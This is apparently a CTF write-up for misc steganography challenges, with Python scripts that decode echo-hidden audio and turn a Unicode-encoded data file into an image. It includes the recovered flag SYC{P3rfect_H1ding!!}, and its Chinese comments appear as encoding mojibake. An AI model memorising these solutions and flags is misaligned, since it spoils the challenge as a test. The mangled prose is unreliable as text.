    def __init__(self, filename):
        self.filename = filename
        self.sample_rate, self.audio_data = wavfile.read(filename)
        
        # å¦‚æœæ˜¯ç«‹ä½“å£°ï¼Œè½¬æ¢ä¸ºå•å£°é“
        if len(self.audio_data.shape) > 1:
            self.audio_data = self.audio_data.mean(axis=1)
        
        # æ ‡å‡†åŒ–éŸ³é¢‘æ•°æ®
        self.audio_data = self.audio_data.astype(np.float32)
        self.audio_data /= np.max(np.abs(self.audio_data))
        
    def analyze_audio_properties(self):
        """åˆ†æéŸ³é¢‘åŸºæœ¬å±æ€§"""
        print("=== éŸ³é¢‘å±æ€§åˆ†æ ===")
        print(f"é‡‡æ ·ç‡: {self.sample_rate} Hz")
        print(f"éŸ³é¢‘é•¿åº¦: {len(self.audio_data)} æ ·æœ¬")
        print(f"æŒç»­æ—¶é—´: {len(self.audio_data)/self.sample_rate:.2f} ç§’")
        print(f"éŸ³é¢‘èŒƒå›´: [{np.min(self.audio_data):.3f}, {np.max(self.audio_data):.3f}]")
        
    def cepstrum_analysis(self, segment_length=1024):
        """å€’è°±åˆ†ææ£€æµ‹å›å£°å»¶è¿Ÿ"""
        print("\n=== å€’è°±åˆ†æ ===")
        
        # é€‰å–éŸ³é¢‘ä¸­é—´éƒ¨åˆ†è¿›è¡Œåˆ†æï¼ˆé€šå¸¸æ›´ç¨³å®šï¼‰
        start_idx = len(self.audio_data) // 3
        end_idx = 2 * len(self.audio_data) // 3
        segment = self.audio_data[start_idx:start_idx + segment_length]
        
        # è®¡ç®—å€’è°±
        spectrum = np.fft.fft(segment)
        log_spectrum = np.log(np.abs(spectrum) + 1e-10)
        cepstrum = np.fft.ifft(log_spectrum).real
        
        # å¯»æ‰¾å³°å€¼
        quefrency_range = min(500, len(cepstrum)//4)  # é™åˆ¶æœç´¢èŒƒå›´
        peaks, properties = signal.find_peaks(cepstrum[:quefrency_range], 
                                            height=np.max(cepstrum[:quefrency_range])*0.3,
                                            distance=10)
        
        print(f"æ£€æµ‹åˆ°çš„å³°å€¼ä½ç½® (queffrency): {peaks}")
        if len(peaks) > 0:
            delays_ms = [(peak / self.sample_rate) * 1000 for peak in peaks]
            print(f"å¯¹åº”çš„å»¶è¿Ÿæ—¶é—´ (ms): {delays_ms}")
            
        return cepstrum, peaks
    
    def autocorrelation_analysis(self, max_lag=1000):
        """è‡ªç›¸å…³åˆ†æ"""
        print("\n=== è‡ªç›¸å…³åˆ†æ ===")
        
        # è®¡ç®—è‡ªç›¸å…³
        autocorr = signal.correlate(self.audio_data, self.audio_data, mode='full')
        autocorr = autocorr[len(autocorr)//2:]  # åªå–æ­£å»¶è¿Ÿéƒ¨åˆ†
        
        # å¯»æ‰¾å³°å€¼ï¼ˆé™¤äº†0å»¶è¿Ÿçš„ä¸»å³°ï¼‰
        search_range = min(max_lag, len(autocorr)//10)
        peaks, properties = signal.find_peaks(autocorr[:search_range], 
                                            height=np.max(autocorr[:search_range])*0.1,
                                            distance=5)
        
        # ç§»é™¤0å»¶è¿Ÿçš„å³°å€¼
        if len(peaks) > 0 and peaks[0] == 0:
            peaks = peaks[1:]
            
        print(f"è‡ªç›¸å…³å³°å€¼ä½ç½®: {peaks}")
        if len(peaks) > 0:
            delays_ms = [(peak / self.sample_rate) * 1000 for peak in peaks]
            print(f"å¯¹åº”çš„å»¶è¿Ÿæ—¶é—´ (ms): {delays_ms}")
            
        return autocorr, peaks
    
    def spectral_analysis(self):
        """é¢‘è°±åˆ†æ"""
        print("\n=== é¢‘è°±åˆ†æ ===")
        
        f, Pxx = signal.welch(self.audio_data, self.sample_rate, nperseg=1024)
        
        # å¯»æ‰¾é¢‘è°±ä¸­çš„å¼‚å¸¸å³°å€¼
        peaks, properties = signal.find_peaks(Pxx, height=np.max(Pxx)*0.01, distance=10)
        
        if len(peaks) > 0:
            significant_peaks = peaks[np.argsort(Pxx[peaks])[-5:]]  # å–æœ€å¼ºçš„5ä¸ªå³°å€¼
            print(f"æ˜¾è‘—é¢‘è°±å³°å€¼é¢‘ç‡: {f[significant_peaks]} Hz")
            
        return f, Pxx
    
    def try_decode_with_parameters(self, delay_samples, amplitude=0.5, bit_duration=0.1):
        """ä½¿ç”¨ç‰¹å®šå‚æ•°å°è¯•è§£ç """
        print(f"\n=== ä½¿ç”¨å‚æ•°å°è¯•è§£ç  ===")
        print(f"å»¶è¿Ÿ: {delay_samples} æ ·æœ¬ ({delay_samples/self.sample_rate*1000:.2f} ms)")
        print(f"å¹…åº¦: {amplitude}")
        print(f"æ¯”ç‰¹æŒç»­æ—¶é—´: {bit_duration} ç§’")
        
        # ç®€å•çš„å›å£°éšè—è§£ç 
        bits_per_second = 1 / bit_duration
        total_bits = int(len(self.audio_data) / self.sample_rate * bits_per_second)
        
        decoded_bits = []
        
        for bit_idx in range(min(total_bits, 100)):  # å…ˆå°è¯•å‰100ä½
            start_sample = int(bit_idx * bit_duration * self.sample_rate)
            end_sample = int((bit_idx + 1) * bit_duration * self.sample_rate)
            
            if end_sample >= len(self.audio_data):
                break
                
            segment = self.audio_data[start_sample:end_sample]
            
            # æ£€æµ‹å›å£°ï¼ˆç®€åŒ–ç‰ˆæœ¬ï¼‰
            if len(segment) > delay_samples:
                original = segment[:-delay_samples]
                echo = segment[delay_samples:]
                
                # è®¡ç®—ç›¸å…³æ€§
                correlation = np.corrcoef(original[:len(echo)], echo)[0,1]
                
                # åˆ¤æ–­æ¯”ç‰¹å€¼
                bit = 1 if correlation > 0.1 else 0
                decoded_bits.append(bit)
        
        # å°è¯•è½¬æ¢ä¸ºASCII
        if len(decoded_bits) >= 8:
            binary_str = ''.join(str(bit) for bit in decoded_bits[:24])  # å‰3ä¸ªå­—ç¬¦
            try:
                # å°è¯•ä¸åŒçš„å­—èŠ‚åº
                chars = []
                for i in range(0, 24, 8):
                    byte = binary_str[i:i+8]
                    # å°è¯•MSBå’ŒLSB
                    char_msb = chr(int(byte, 2))
                    char_lsb = chr(int(byte[::-1], 2))
                    chars.append((char_msb, char_lsb))
                
                print(f"è§£ç ç»“æœ (MSB): {''.join([c[0] for c in chars])}")
                print(f"è§£ç ç»“æœ (LSB): {''.join([c[1] for c in chars])}")
                
                # æ£€æŸ¥æ˜¯å¦åŒ¹é…"SYC"
                result_msb = ''.join([c[0] for c in chars])
                result_lsb = ''.join([c[1] for c in chars])
                
                if result_msb == "SYC":
                    print("ğŸ‰ æˆåŠŸåŒ¹é…åˆ° 'SYC' (MSB)")
                    return True, decoded_bits
                elif result_lsb == "SYC":
                    print("ğŸ‰ æˆåŠŸåŒ¹é…åˆ° 'SYC' (LSB)")
                    return True, decoded_bits
                    
            except:
                print("è§£ç å¤±è´¥")
                
        return False, decoded_bits
    
    def brute_force_parameters(self):
        """æš´åŠ›æœç´¢å¯èƒ½çš„å‚æ•°"""
        print("\n=== å‚æ•°æš´åŠ›æœç´¢ ===")
        
        # å¸¸è§çš„å›å£°éšè—å‚æ•°èŒƒå›´
        delays_ms = [0.5, 1.0, 2.0, 3.0, 5.0, 8.0, 10.0, 15.0, 20.0, 25.0, 30.0]
        amplitudes = [0.3, 0.4, 0.5, 0.6, 0.7]
        bit_durations = [0.05, 0.1, 0.15, 0.2, 0.25, 0.3]
        
        found = False
        attempts = 0
        
        for delay_ms in delays_ms:
            delay_samples = int(delay_ms / 1000 * self.sample_rate)
            for amplitude in amplitudes:
                for bit_duration in bit_durations:
                    attempts += 1
                    success, bits = self.try_decode_with_parameters(
                        delay_samples, amplitude, bit_duration)
                    if success:
                        found = True
                        print(f"\nâœ… æ‰¾åˆ°æœ‰æ•ˆå‚æ•°:")
                        print(f"   å»¶è¿Ÿ: {delay_ms} ms")
                        print(f"   å¹…åº¦: {amplitude}")
                        print(f"   æ¯”ç‰¹æ—¶é•¿: {bit_duration} ç§’")
                        return delay_samples, amplitude, bit_duration, bits
        
        print(f"\nâŒ å°è¯•äº† {attempts} ç§å‚æ•°ç»„åˆï¼Œæœªæ‰¾åˆ°åŒ¹é…'SYC'çš„å‚æ•°")
        return None, None, None, None
    
    def plot_analysis(self, cepstrum, cepstrum_peaks, autocorr, autocorr_peaks, freq, psd):
        """ç»˜åˆ¶åˆ†æç»“æœ"""
        fig, axes = plt.subplots(2, 2, figsize=(15, 10))
        
        # åŸå§‹éŸ³é¢‘
        time_axis = np.arange(len(self.audio_data)) / self.sample_rate
        axes[0,0].plot(time_axis, self.audio_data)
        axes[0,0].set_title('åŸå§‹éŸ³é¢‘ä¿¡å·')
        axes[0,0].set_xlabel('æ—¶é—´ (s)')
        axes[0,0].set_ylabel('å¹…åº¦')
        
        # å€’è°±
        quefrency_axis = np.arange(len(cepstrum)) / self.sample_rate * 1000  # ms
        axes[0,1].plot(quefrency_axis[:500], cepstrum[:500])
        axes[0,1].plot(quefrency_axis[cepstrum_peaks], cepstrum[cepstrum_peaks], 'ro')
        axes[0,1].set_title('å€’è°±åˆ†æ (å›å£°å»¶è¿Ÿæ£€æµ‹)')
        axes[0,1].set_xlabel('Quefrency (ms)')
        axes[0,1].set_ylabel('å¹…åº¦')
        
        # è‡ªç›¸å…³
        lag_axis = np.arange(len(autocorr)) / self.sample_rate * 1000  # ms
        axes[1,0].plot(lag_axis[:1000], autocorr[:1000])
        axes[1,0].plot(lag_axis[autocorr_peaks], autocorr[autocorr_peaks], 'ro')
        axes[1,0].set_title('è‡ªç›¸å…³åˆ†æ')
        axes[1,0].set_xlabel('å»¶è¿Ÿ (ms)')
        axes[1,0].set_ylabel('ç›¸å…³æ€§')
        
        # é¢‘è°±
        axes[1,1].semilogy(freq, psd)
        axes[1,1].set_title('åŠŸç‡è°±å¯†åº¦')
        axes[1,1].set_xlabel('é¢‘ç‡ (Hz)')
        axes[1,1].set_ylabel('PSD')
        
        plt.tight_layout()
        plt.show()

def main():
    analyzer = EchoHidingAnalyzer('1.wav')
    
    # åŸºæœ¬åˆ†æ
    analyzer.analyze_audio_properties()
    
    # å„ç§åˆ†ææŠ€æœ¯
    cepstrum, cepstrum_peaks = analyzer.cepstrum_analysis()
    autocorr, autocorr_peaks = analyzer.autocorrelation_analysis()
    freq, psd = analyzer.spectral_analysis()
    
    # ç»˜åˆ¶ç»“æœ
    analyzer.plot_analysis(cepstrum, cepstrum_peaks, autocorr, autocorr_peaks, freq, psd)
    
    # æš´åŠ›æœç´¢å‚æ•°
    delay, amplitude, bit_duration, bits = analyzer.brute_force_parameters()
    
    if delay is not None:
        print(f"\nğŸ¯ å»ºè®®çš„è§£ç å‚æ•°:")
        print(f"   å»¶è¿Ÿ: {delay} æ ·æœ¬ ({delay/analyzer.sample_rate*1000:.2f} ms)")
        print(f"   å¹…åº¦: {amplitude}")
        print(f"   æ¯”ç‰¹æ—¶é•¿: {bit_duration} ç§’")
        
        # ä½¿ç”¨æ‰¾åˆ°çš„å‚æ•°å®Œæ•´è§£ç 
        print(f"\n=== å®Œæ•´è§£ç å°è¯• ===")
        success, full_bits = analyzer.try_decode_with_parameters(delay, amplitude, bit_duration)
        
        if success and len(full_bits) >= 24:
            # è§£ç æ›´å¤šæ•°æ®
            binary_str = ''.join(str(bit) for bit in full_bits)
            try:
                # æŒ‰8ä½ä¸€ç»„è§£ç 
                decoded_text = ""
                for i in range(0, len(binary_str)-7, 8):
                    byte = binary_str[i:i+8]
                    char = chr(int(byte, 2))
                    if char.isprintable():
                        decoded_text += char
                    else:
                        decoded_text += "?"
                
                print(f"è§£ç æ–‡æœ¬: {decoded_text}")
            except:
                print("å®Œæ•´è§£ç å¤±è´¥")

if __name__ == "__main__":
    main()
```

è¿™é‡Œçš„è„šæœ¬è¿è¡Œå‡ºæ¥æœ‰ä¸€ä¸ªè¶…çº§åƒçš„äº†

```
SYC{P3rfect_
```

å†è®©dè€å¸ˆå®Œå–„ä¸€ä¸‹

```
import numpy as np
import matplotlib.pyplot as plt
from scipy.io import wavfile
from scipy import signal
import warnings

warnings.filterwarnings('ignore')


class EchoHidingDecoder:
    def __init__(self, filename):
        self.filename = filename
        self.sample_rate, self.audio_data = wavfile.read(filename)

        # å¦‚æœæ˜¯ç«‹ä½“å£°ï¼Œè½¬æ¢ä¸ºå•å£°é“
        if len(self.audio_data.shape) > 1:
            self.audio_data = self.audio_data.mean(axis=1)

        # æ ‡å‡†åŒ–éŸ³é¢‘æ•°æ®
        self.audio_data = self.audio_data.astype(np.float32)
        self.audio_data /= np.max(np.abs(self.audio_data))

    def decode_full_message(self, delay_samples, amplitude=0.3, bit_duration=0.1):
        """ä½¿ç”¨æ‰¾åˆ°çš„å‚æ•°å®Œæ•´è§£ç æ¶ˆæ¯"""
        print(f"\n=== å®Œæ•´è§£ç  ===")
        print(f"å‚æ•°: å»¶è¿Ÿ={delay_samples}æ ·æœ¬({delay_samples / self.sample_rate * 1000:.2f}ms), "
              f"å¹…åº¦={amplitude}, æ¯”ç‰¹æ—¶é•¿={bit_duration}s")

        bits_per_second = 1 / bit_duration
        total_bits = int(len(self.audio_data) / self.sample_rate * bits_per_second)

        decoded_bits = []

        print(f"é¢„è®¡æ€»æ¯”ç‰¹æ•°: {total_bits}")

        for bit_idx in range(total_bits):
            start_sample = int(bit_idx * bit_duration * self.sample_rate)
            end_sample = int((bit_idx + 1) * bit_duration * self.sample_rate)

            if end_sample >= len(self.audio_data):
                break

            segment = self.audio_data[start_sample:end_sample]

            # æ£€æµ‹å›å£°
            if len(segment) > delay_samples:
                original = segment[:-delay_samples]
                echo = segment[delay_samples:]

                # ç¡®ä¿é•¿åº¦ä¸€è‡´
                min_len = min(len(original), len(echo))
                if min_len > 0:
                    original = original[:min_len]
                    echo = echo[:min_len]

                    # è®¡ç®—ç›¸å…³æ€§
                    correlation = np.corrcoef(original, echo)[0, 1]

                    # åˆ¤æ–­æ¯”ç‰¹å€¼ (åŸºäºç›¸å…³æ€§é˜ˆå€¼)
                    bit = 1 if correlation > 0.1 else 0
                    decoded_bits.append(bit)

            # è¿›åº¦æ˜¾ç¤º
            if bit_idx % 100 == 0:
                print(f"è§£ç è¿›åº¦: {bit_idx}/{total_bits}")

        print(f"å®é™…è§£ç æ¯”ç‰¹æ•°: {len(decoded_bits)}")

        # è½¬æ¢ä¸ºå­—èŠ‚
        binary_str = ''.join(str(bit) for bit in decoded_bits)

        # å°è¯•ä¸åŒçš„å­—èŠ‚å¯¹é½æ–¹å¼
        decoded_text_msb = ""
        decoded_text_lsb = ""

        # MSB first
        for i in range(0, len(binary_str) - 7, 8):
            byte = binary_str[i:i + 8]
            try:
                char = chr(int(byte, 2))
                if char.isprintable() or char in '\n\r\t':
                    decoded_text_msb += char
                else:
                    decoded_text_msb += f"\\x{int(byte, 2):02x}"
            except:
                decoded_text_msb += "?"

        # LSB first
        for i in range(0, len(binary_str) - 7, 8):
            byte = binary_str[i:i + 8][::-1]  # åè½¬æ¯”ç‰¹é¡ºåº
            try:
                char = chr(int(byte, 2))
                if char.isprintable() or char in '\n\r\t':
                    decoded_text_lsb += char
                else:
                    decoded_text_lsb += f"\\x{int(byte, 2):02x}"
            except:
                decoded_text_lsb += "?"

        print(f"\nMSBè§£ç ç»“æœ: {decoded_text_msb}")
        print(f"LSBè§£ç ç»“æœ: {decoded_text_lsb}")

        return decoded_bits, decoded_text_msb, decoded_text_lsb

    def advanced_echo_detection(self, delay_samples, bit_duration=0.1, method='correlation'):
        """ä½¿ç”¨æ›´é«˜çº§çš„å›å£°æ£€æµ‹æ–¹æ³•"""
        print(f"\n=== é«˜çº§å›å£°æ£€æµ‹ ===")

        bits_per_second = 1 / bit_duration
        total_bits = int(len(self.audio_data) / self.sample_rate * bits_per_second)

        decoded_bits = []
        correlations = []

        for bit_idx in range(total_bits):
            start_sample = int(bit_idx * bit_duration * self.sample_rate)
            end_sample = int((bit_idx + 1) * bit_duration * self.sample_rate)

            if end_sample >= len(self.audio_data):
                break

            segment = self.audio_data[start_sample:end_sample]

            if len(segment) > delay_samples:
                if method == 'correlation':
                    # ç›¸å…³æ€§æ–¹æ³•
                    original = segment[:-delay_samples]
                    echo = segment[delay_samples:]

                    min_len = min(len(original), len(echo))
                    if min_len > 10:  # ç¡®ä¿æœ‰è¶³å¤Ÿçš„æ•°æ®ç‚¹
                        original = original[:min_len]
                        echo = echo[:min_len]

                        correlation = np.corrcoef(original, echo)[0, 1]
                        correlations.append(correlation)

                        # è‡ªé€‚åº”é˜ˆå€¼
                        if len(correlations) > 10:
                            threshold = np.mean(correlations[-10:]) + 0.5 * np.std(correlations[-10:])
                        else:
                            threshold = 0.1

                        bit = 1 if correlation > threshold else 0
                        decoded_bits.append(bit)

                elif method == 'energy':
                    # èƒ½é‡æ¯”è¾ƒæ–¹æ³•
                    original_energy = np.sum(segment[:-delay_samples] ** 2)
                    echo_energy = np.sum(segment[delay_samples:] ** 2)

                    if original_energy > 0:
                        energy_ratio = echo_energy / original_energy
                        bit = 1 if energy_ratio > 0.05 else 0  # è°ƒæ•´é˜ˆå€¼
                        decoded_bits.append(bit)
                        correlations.append(energy_ratio)

        return decoded_bits, correlations

    def find_message_end(self, decoded_text):
        """å°è¯•æ‰¾åˆ°æ¶ˆæ¯çš„ç»“æŸä½ç½®"""
        # æŸ¥æ‰¾å¸¸è§çš„ç»“æŸæ ‡å¿—
        end_indicators = ['}', ']', ')', 'EOF', 'END', '\x00']

        for indicator in end_indicators:
            if indicator in decoded_text:
                end_pos = decoded_text.find(indicator)
                return decoded_text[:end_pos + len(indicator)]

        # å¦‚æœæ²¡æœ‰æ˜æ˜¾ç»“æŸæ ‡å¿—ï¼Œå°è¯•æ‰¾åˆ°ç¬¬ä¸€ä¸ªéå¯æ‰“å°å­—ç¬¦
        for i, char in enumerate(decoded_text):
            if not char.isprintable() and char not in '\n\r\t':
                return decoded_text[:i]

        return decoded_text


def main():
    # ä½¿ç”¨æˆ‘ä»¬æ‰¾åˆ°çš„æœ‰æ•ˆå‚æ•°
    decoder = EchoHidingDecoder('1.wav')

    # å‚æ•°ï¼šå»¶è¿Ÿ1102æ ·æœ¬ï¼Œå¹…åº¦0.3ï¼Œæ¯”ç‰¹æ—¶é•¿0.1ç§’
    delay_samples = 1102
    amplitude = 0.3
    bit_duration = 0.1

    print("å¼€å§‹å®Œæ•´è§£ç ...")

    # æ–¹æ³•1ï¼šåŸºæœ¬è§£ç 
    bits1, text_msb1, text_lsb1 = decoder.decode_full_message(delay_samples, amplitude, bit_duration)

    # æ–¹æ³•2ï¼šé«˜çº§ç›¸å…³æ€§æ£€æµ‹
    print("\nå°è¯•é«˜çº§ç›¸å…³æ€§æ£€æµ‹...")
    bits2, correlations = decoder.advanced_echo_detection(delay_samples, bit_duration, method='correlation')

    if len(bits2) > 0:
        binary_str2 = ''.join(str(bit) for bit in bits2)
        decoded_text2 = ""
        for i in range(0, len(binary_str2) - 7, 8):
            byte = binary_str2[i:i + 8]
            try:
                char = chr(int(byte, 2))
                decoded_text2 += char
            except:
                decoded_text2 += "?"

        print(f"é«˜çº§ç›¸å…³æ€§è§£ç : {decoded_text2}")

    # æ–¹æ³•3ï¼šå°è¯•ä¸åŒçš„æ¯”ç‰¹æ—¶é•¿
    print("\nå°è¯•ä¸åŒçš„æ¯”ç‰¹æ—¶é•¿...")
    for bit_dur in [0.08, 0.09, 0.1, 0.11, 0.12]:
        try:
            bits, text_msb, text_lsb = decoder.decode_full_message(delay_samples, amplitude, bit_dur)
            if "SYC" in text_msb or "SYC" in text_lsb:
                print(f"æ¯”ç‰¹æ—¶é•¿ {bit_dur}: æ‰¾åˆ°SYC")
        except:
            pass

    # å¯è§†åŒ–ç›¸å…³æ€§ï¼ˆå¦‚æœå¯ç”¨ï¼‰
    if len(correlations) > 0:
        plt.figure(figsize=(12, 4))
        plt.plot(correlations[:200])  # åªæ˜¾ç¤ºå‰200ä¸ªç‚¹
        plt.title('å›å£°ç›¸å…³æ€§åºåˆ—')
        plt.xlabel('æ¯”ç‰¹ä½ç½®')
        plt.ylabel('ç›¸å…³æ€§')
        plt.grid(True)
        plt.show()


if __name__ == "__main__":
    main()
```

ç»“æœ

```
å¼€å§‹å®Œæ•´è§£ç ...

=== å®Œæ•´è§£ç  ===
å‚æ•°: å»¶è¿Ÿ=1102æ ·æœ¬(24.99ms), å¹…åº¦=0.3, æ¯”ç‰¹æ—¶é•¿=0.1s
é¢„è®¡æ€»æ¯”ç‰¹æ•°: 260
è§£ç è¿›åº¦: 0/260
è§£ç è¿›åº¦: 100/260
è§£ç è¿›åº¦: 200/260
å®é™…è§£ç æ¯”ç‰¹æ•°: 260

MSBè§£ç ç»“æœ: SYC{P3rfect_H1ding!!}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
LSBè§£ç ç»“æœ: ÃŠ\x9aÃ‚Ã
ÃŒNfÂ¦Ã†.Ãº\x12\x8c&\x96vÃ¦\x84\x84Â¾\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
```

# 4ak5ra

éšæ³¢é€æµä¸€æŠŠæ¢­ï¼Œå…ˆbinwalkå†LSBå°±è¡Œäº†ï¼Œæ°´é¢˜ï¼ˆ



# monitoring

å¯¹æ¯”å›¾ç‰‡ç„¶åè®©aiç”Ÿæˆä¸€ä¸ªèƒ½è‡ªå·±ç‚¹æ ¼å­çš„è„šæœ¬ç„¶åçˆ½ç‚¹ï¼ˆ

![86c90bd6d0b816bb3821c60684f978e9](D:/CTF-competition/2025-Geek Challenge/misc/86c90bd6d0b816bb3821c60684f978e9.png)

# words

è®©aiåˆ†æå†™è„šæœ¬

```
def decode_data():
    """å°†Unicodeå­—ç¬¦ç¼–ç çš„æ•°æ®è§£ç å›åŸå§‹äºŒè¿›åˆ¶"""

    print("=" * 70)
    print("ğŸ”“ è§£ç  data.txt")
    print("=" * 70)

    # è¯»å–æ•°æ®
    with open('data.txt', 'r', encoding='utf-8') as f:
        text = f.read().strip()

    print(f"\nğŸ“Š æ•°æ®ä¿¡æ¯:")
    print(f"  å­—ç¬¦æ€»æ•°: {len(text):,}")

    # è·å–æ‰€æœ‰å”¯ä¸€å­—ç¬¦å¹¶æ’åº
    unique_chars = sorted(set(text), key=lambda c: ord(c))
    print(f"  å”¯ä¸€å­—ç¬¦: {len(unique_chars)} ç§")

    if len(unique_chars) != 256:
        print(f"  âš ï¸  è­¦å‘Š: å­—ç¬¦æ•°ä¸æ˜¯256ï¼å®é™…æ˜¯ {len(unique_chars)}")

    # å»ºç«‹å­—ç¬¦åˆ°å­—èŠ‚çš„æ˜ å°„
    # æ–¹æ¡ˆ1: æŒ‰Unicodeç ç‚¹é¡ºåºæ˜ å°„
    char_to_byte_v1 = {char: i for i, char in enumerate(unique_chars)}

    # æ–¹æ¡ˆ2: æŒ‰å‡ºç°é¢‘ç‡æ˜ å°„ï¼ˆä¸å¤ªå¯èƒ½ä½†è¯•è¯•ï¼‰
    from collections import Counter
    char_freq = Counter(text)
    sorted_by_freq = sorted(unique_chars, key=lambda c: -char_freq[c])
    char_to_byte_v2 = {char: i for i, char in enumerate(sorted_by_freq)}

    # æ–¹æ¡ˆ3: ç›´æ¥ç”¨Unicodeç ç‚¹çš„æœ€ä½å­—èŠ‚
    char_to_byte_v3 = {char: ord(char) & 0xFF for char in unique_chars}

    # å°è¯•å¤šç§è§£ç æ–¹æ¡ˆ
    for method, mapping in [
        ("æŒ‰ç ç‚¹é¡ºåº", char_to_byte_v1),
        ("æŒ‰é¢‘ç‡é¡ºåº", char_to_byte_v2),
        ("ç ç‚¹æœ€ä½å­—èŠ‚", char_to_byte_v3)
    ]:
        print(f"\nğŸ”„ å°è¯•æ–¹æ¡ˆ: {method}")

        # è§£ç 
        binary_data = bytes([mapping[char] for char in text])

        # ä¿å­˜æ–‡ä»¶
        output_file = f'decoded_{method.replace(" ", "_")}.bin'
        with open(output_file, 'wb') as f:
            f.write(binary_data)

        print(f"  âœ… å·²ä¿å­˜: {output_file}")

        # æ£€æŸ¥æ–‡ä»¶å¤´ï¼ˆé­”æ•°ï¼‰
        header = binary_data[:20]
        print(f"  ğŸ“‹ æ–‡ä»¶å¤´ (hex): {header.hex()}")
        print(f"  ğŸ“‹ æ–‡ä»¶å¤´ (ascii): {header}")

        # è¯†åˆ«æ–‡ä»¶ç±»å‹
        file_type = identify_file_type(binary_data)
        print(f"  ğŸ” å¯èƒ½çš„æ–‡ä»¶ç±»å‹: {file_type}")

        # å¦‚æœæ˜¯1200x1200ï¼Œå¯èƒ½æ˜¯å›¾åƒæ•°æ®
        if len(binary_data) == 1440000:
            # 1200*1200 = 1,440,000
            print(f"  ğŸ’¡ å°ºå¯¸åŒ¹é…: 1200Ã—1200 åƒç´ ")

            # å°è¯•ä½œä¸ºåŸå§‹å›¾åƒæ•°æ®
            try:
                from PIL import Image
                import numpy as np

                # å°è¯•ç°åº¦å›¾
                img_gray = Image.frombytes('L', (1200, 1200), binary_data)
                img_gray.save(f'image_gray_{method.replace(" ", "_")}.png')
                print(f"  âœ… ç°åº¦å›¾: image_gray_{method.replace(" ", "_")}.png")

                # å°è¯•RGB (1200x1200 æ— æ³•æ•´é™¤3ï¼Œæ‰€ä»¥ä¸å¤ªå¯èƒ½)
            except Exception as e:
                print(f"  âš ï¸  ä½œä¸ºå›¾åƒå¤±è´¥: {e}")


def identify_file_type(data):
    """æ ¹æ®æ–‡ä»¶å¤´è¯†åˆ«æ–‡ä»¶ç±»å‹"""

    if len(data) < 4:
        return "æ•°æ®å¤ªçŸ­"

    # å¸¸è§æ–‡ä»¶ç­¾å
    signatures = {
        b'\x89PNG': 'PNG å›¾åƒ',
        b'\xFF\xD8\xFF': 'JPEG å›¾åƒ',
        b'GIF8': 'GIF å›¾åƒ',
        b'BM': 'BMP å›¾åƒ',
        b'PK\x03\x04': 'ZIP å‹ç¼©æ–‡ä»¶',
        b'Rar!': 'RAR å‹ç¼©æ–‡ä»¶',
        b'\x1F\x8B': 'GZIP å‹ç¼©æ–‡ä»¶',
        b'%PDF': 'PDF æ–‡æ¡£',
        b'\x7FELF': 'ELF å¯æ‰§è¡Œæ–‡ä»¶',
        b'MZ': 'Windows å¯æ‰§è¡Œæ–‡ä»¶',
    }

    for sig, desc in signatures.items():
        if data.startswith(sig):
            return desc

    # æ£€æŸ¥æ˜¯å¦å…¨æ˜¯å¯æ‰“å°å­—ç¬¦
    try:
        data[:100].decode('ascii')
        return "å¯èƒ½æ˜¯æ–‡æœ¬æ–‡ä»¶"
    except:
        pass

    return "æœªçŸ¥äºŒè¿›åˆ¶æ ¼å¼"


if __name__ == '__main__':
    decode_data()

    print("\n" + "=" * 70)
    print("ğŸ“Œ ä¸‹ä¸€æ­¥:")
    print("  1. æ£€æŸ¥ç”Ÿæˆçš„ .bin æ–‡ä»¶")
    print("  2. ä½¿ç”¨ 'file' å‘½ä»¤: file decoded_*.bin")
    print("  3. ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æŸ¥çœ‹")
    print("  4. å¦‚æœæ˜¯å›¾åƒï¼ŒæŸ¥çœ‹ç”Ÿæˆçš„ .png æ–‡ä»¶")
    print("=" * 70)
```

è¿™ä¸ªè„šæœ¬ç”Ÿæˆçš„æŒ‰é¢‘ç‡çš„å›¾ç‰‡èƒ½çœ‹å‡ºä¸œè¥¿

```
from PIL import Image
import numpy as np
from collections import Counter


def decode_and_visualize():
    """æŒ‰é¢‘ç‡æ’åºè§£ç å¹¶ç”Ÿæˆåè‰²å›¾åƒ"""

    print("=" * 70)
    print("ğŸ¨ æŒ‰é¢‘ç‡è§£ç  + åè‰²")
    print("=" * 70)

    # è¯»å–æ•°æ®
    with open('data.txt', 'r', encoding='utf-8') as f:
        text = f.read().strip()

    print(f"\nğŸ“Š æ•°æ®ä¿¡æ¯:")
    print(f"  å­—ç¬¦æ€»æ•°: {len(text):,}")

    # ç»Ÿè®¡å­—ç¬¦é¢‘ç‡
    char_freq = Counter(text)
    print(f"  å”¯ä¸€å­—ç¬¦: {len(char_freq)} ç§")

    # æŒ‰é¢‘ç‡ä»é«˜åˆ°ä½æ’åº
    sorted_chars = sorted(char_freq.items(), key=lambda x: -x[1])

    print(f"\nğŸ“ˆ æœ€å¸¸è§çš„10ä¸ªå­—ç¬¦:")
    for i, (char, count) in enumerate(sorted_chars[:10]):
        print(f"  #{i}: '{char}' (U+{ord(char):04X}) -> æ˜ å°„åˆ° {i}, å‡ºç° {count:,} æ¬¡")

    # å»ºç«‹æ˜ å°„ï¼šæœ€å¸¸è§çš„å­—ç¬¦ -> 0ï¼Œæ¬¡å¸¸è§ -> 1ï¼Œ...
    char_to_byte = {char: i for i, (char, _) in enumerate(sorted_chars)}

    # è§£ç 
    print(f"\nğŸ”„ è§£ç ä¸­...")
    binary_data = bytes([char_to_byte[char] for char in text])

    # ä¿å­˜äºŒè¿›åˆ¶
    with open('decoded_freq.bin', 'wb') as f:
        f.write(binary_data)
    print(f"  âœ… å·²ä¿å­˜: decoded_freq.bin")

    # ç”Ÿæˆå›¾åƒ (1200 x 1200)
    print(f"\nğŸ–¼ï¸  ç”Ÿæˆå›¾åƒ...")
    width, height = 1200, 1200

    if len(binary_data) == width * height:
        # è½¬æ¢ä¸ºnumpyæ•°ç»„
        img_array = np.frombuffer(binary_data, dtype=np.uint8).reshape(height, width)

        # åŸå§‹å›¾åƒ
        img_original = Image.fromarray(img_array, mode='L')
        img_original.save('image_freq_original.png')
        print(f"  âœ… åŸå§‹å›¾åƒ: image_freq_original.png")

        # åè‰²å›¾åƒ
        img_inverted = Image.fromarray(255 - img_array, mode='L')
        img_inverted.save('image_freq_inverted.png')
        print(f"  âœ… åè‰²å›¾åƒ: image_freq_inverted.png")

        # æ˜¾ç¤ºç»Ÿè®¡
        print(f"\nğŸ“Š å›¾åƒç»Ÿè®¡:")
        print(f"  å°ºå¯¸: {width} Ã— {height}")
